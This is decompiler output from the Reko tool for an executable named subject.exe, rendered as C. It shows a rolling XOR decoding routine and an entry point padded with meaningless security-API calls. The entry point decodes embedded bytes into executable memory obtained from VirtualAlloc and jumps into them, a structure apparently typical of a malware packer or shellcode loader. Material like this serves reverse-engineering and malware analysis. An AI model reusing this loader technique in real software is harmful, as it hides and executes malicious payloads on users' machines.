// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 13101000: void fn13101000(Stack (ptr byte) dwArg04, Stack ptr32 dwArg08, Stack word32 dwArg0C, Stack (ptr word32) dwArg10, Stack word32 dwArg14, Stack Eq_7 dwArg18)
void fn13101000(byte * dwArg04, ptr32 dwArg08, word32 dwArg0C, word32 * dwArg10, word32 dwArg14, Eq_7 dwArg18)
{
	*dwArg10 = dwArg0C;
	word16 wLoc08_25 = (word16) (uint32) ((uint64) (uint32) dwArg14 % 0x05);
	byte * dwArg08_30 = dwArg08 + dwArg14;
	while (true)
	{
		dwArg0C = dwArg0C - 0x01;
		if (dwArg0C == 0x00)
			break;
		Mem77[dwArg04 + 0x00:byte] = (byte) ((int32) *dwArg08_30 ^ (word32) Mem13[(int32) wLoc08_25 + dwArg18:byte]);
		word16 ax_79 = wLoc08_25 + 0x01;
		wLoc08_25 = ax_79;
		if ((int32) ax_79 == 0x05)
			wLoc08_25 = 0x00;
		dwArg04 = dwArg04 + 0x01;
		dwArg08_30 = dwArg08_30 + 0x01;
	}
}

// 1310109B: Register Eq_48 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	AddAccessDeniedAce((ACL *) 0x02800000, 0x04A00000, 0x2600, null);
	word32 esp_37;
	word32 ebp_38;
	byte SCZO_39;
	word32 eax_40;
	word32 ebx_41;
	word32 ecx_42;
	word32 esi_43;
	word32 edx_44;
	byte SZO_45;
	byte C_46;
	byte Z_47;
	word32 edi_48;
	byte dl_49;
	ADVAPI32.dll!BuildExplicitAccessWithNameA();
	word32 esp_51;
	word32 ebp_52;
	byte SCZO_53;
	word32 eax_54;
	word32 ebx_55;
	word32 ecx_56;
	word32 esi_57;
	word32 edx_58;
	byte SZO_59;
	byte C_60;
	byte Z_61;
	word32 edi_62;
	byte dl_63;
	KERNEL32.dll!BaseInitAppcompatCacheSupport();
	HRESULT eax_24 = SafeArrayGetUBound(null, 0x028C0000, (LONG *) 0x0900);
	word32 eax_73 = *((word32) eax_24 - 0x6CF5E057);
	fn13101000(fp - 0x023C, fp - 0x023C, 0x04, fp - 0x10, 0x00, fp - 0x0234);
	Eq_92 eax_94 = SetErrorMode(0x0BC0);
	word32 esp_100;
	word32 ebp_101;
	byte SCZO_102;
	word32 eax_103;
	word32 ebx_104;
	word32 ecx_105;
	word32 esi_106;
	word32 edx_107;
	byte SZO_108;
	byte C_109;
	byte Z_110;
	word32 edi_111;
	byte dl_112;
	KERNEL32.dll!BaseInitAppcompatCacheSupport();
	Eq_136 ecx_114 = *((word32) eax_24 - 1828053075);
	fn13101000(fp - 600, fp - 0x025C, 0x04, fp - 0x10, 0x04, fp - 0x0234);
	Eq_152 ecx_137 = *((word32) eax_24 - 1828053071);
	word32 esp_139;
	word32 ebp_140;
	byte SCZO_141;
	word32 eax_142;
	word32 ebx_143;
	word32 ecx_144;
	word32 esi_145;
	word32 edx_146;
	byte SZO_147;
	byte C_148;
	byte Z_149;
	word32 edi_150;
	byte dl_151;
	KERNEL32.dll!BaseDumpAppcompatCache();
	fn13101000(fp - 0x14, fp - 0x1C, 0x04, fp - 0x10, 0x08, fp - 0x0234);
	Eq_182 eax_176 = GetModuleHandleA(null);
	Eq_59 eax_195 = AdjustTokenGroups(null, 0x00, (struct _TOKEN_GROUPS *) 0x4400, 0x80000000, (struct _TOKEN_GROUPS *) 0x78000000, null);
	word32 esp_206;
	word32 ebp_207;
	byte SCZO_208;
	word32 eax_209;
	word32 ebx_210;
	word32 ecx_211;
	word32 esi_212;
	word32 edx_213;
	byte SZO_214;
	byte C_215;
	byte Z_216;
	word32 edi_217;
	byte dl_218;
	ADVAPI32.dll!ControlTraceA();
	word32 esp_232;
	word32 ebp_233;
	byte SCZO_234;
	word32 eax_235;
	word32 ebx_236;
	word32 ecx_237;
	word32 esi_238;
	word32 edx_239;
	byte SZO_240;
	byte C_241;
	byte Z_242;
	word32 edi_243;
	byte dl_244;
	ADVAPI32.dll!BuildTrusteeWithObjectsAndNameA();
	Eq_232 ebx_246 = *((word32) eax_24 - 1828053067);
	fn13101000(fp - 0x1C, fp - 0x28, 0x04, fp - 0x10, 0x0C, fp - 0x0234);
	Eq_248 dwLoc2388_279 = *((word32) eax_24 - 1828053063);
	fn13101000(fp + ~0x2387, fp + ~0x2397, 0x04, fp - 0x10, 0x10, fp - 0x0234);
	Eq_248 ebx_307 = ecx_137 * 0x08 + 0x0C;
	ui32 dwLoc2390_302 = 0x14;
	word32 dwLoc24_305 = eax_24 + 2466914237;
	word32 eax_320 = VirtualAlloc(null, ebx_307 + ecx_114 + eax_73, 0x3000, 0x40);
	word32 dwLoc0C_325 = ebx_246 + eax_176 + ebx_307;
	Eq_248 dwLoc0264_329 = ebx_307;
	word32 dwLoc08_330 = 0x00;
	word32 dwLoc18_331 = 0x00;
	while (0x01 != 0x00)
	{
		if (dwLoc0264_329 == dwLoc2388_279)
		{
			Eq_152 eax_458 = (word32) dwLoc08_330.dw0000 + 0x01;
			dwLoc08_330 = eax_458;
			if (eax_458 == ecx_137)
				break;
			Eq_402 ecx_464 = *((char *) &dwLoc24_305->t930A1FB9.t0000.t0000 + 1828053063);
			*(fp - 0x0334) = fp - 0x0234;
			*(fp - 0x0338) = dwLoc2390_302;
			*(fp - 0x033C) = fp - 0x10;
			*(fp - 0x0340) = 0x04;
			*(fp - 0x0344) = fp - 0x1C - dwLoc2390_302;
			*(fp - 0x0348) = fp - 0x1C;
			fn13101000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
			word32 ebx_493 = dwLoc24_305 + 0x04;
			dwLoc2388_279 = (Eq_248) ebx_493->t0000.dw0000;
			*(fp - 0x0334) = fp - 0x0234;
			ui32 ebx_490 = dwLoc2390_302 + 0x04;
			*(fp - 0x0338) = ebx_490;
			*(fp - 0x033C) = fp - 0x10;
			*(fp - 0x0340) = 0x04;
			*(fp - 0x0344) = fp + ~0x2387 - ebx_490;
			*(fp - 0x0348) = fp + ~0x2387;
			fn13101000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
			dwLoc2390_302 = ebx_490 + 0x04;
			dwLoc24_305 = ebx_493 + 0x04;
			dwLoc0264_329 = 0x00;
			dwLoc0C_325 = ecx_464 + eax_176;
		}
		*((char *) eax_320 + dwLoc18_331) = (Eq_274) *dwLoc0C_325.t0000;
		dwLoc0C_325 = dwLoc0C_325 + 0x01;
		dwLoc18_331 = dwLoc18_331 + 0x01;
		dwLoc0264_329 = dwLoc0264_329 + 0x01;
	}
	*(fp - 0x0334) = fp - 0x0234;
	(fp - 0x0338)->t0000.t0000 = ebx_307;
	*(fp - 0x033C) = fp - 0x0238;
	(fp - 0x0340)->t0000 = (LPVOID) ecx_114;
	*(fp - 0x0344) = (LPVOID *) (eax_320 - ebx_307);
	*(fp - 0x0348) = (LPVOID *) eax_320;
	fn13101000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	*(fp - 0x0334) = fp;
	*(fp - 0x0338) = fp - 0x0234;
	(fp - 0x033C)->t0000 = (LPVOID) ecx_114;
	*(fp - 0x0340) = eax_73;
	*(fp - 0x0344) = (LPVOID *) eax_320;
	word32 eax_402 = eax_320 + ecx_114;
	*(fp - 0x0348) = (LPVOID *) eax_402;
	word32 esp_406;
	word32 ebp_407;
	byte SCZO_408;
	Eq_48 eax_409;
	word32 ebx_410;
	word32 ecx_411;
	word32 esi_412;
	word32 edx_413;
	byte SZO_414;
	byte C_415;
	byte Z_416;
	word32 edi_417;
	byte dl_418;
	(eax_320 + 0x0F50)();
	return eax_409;
}

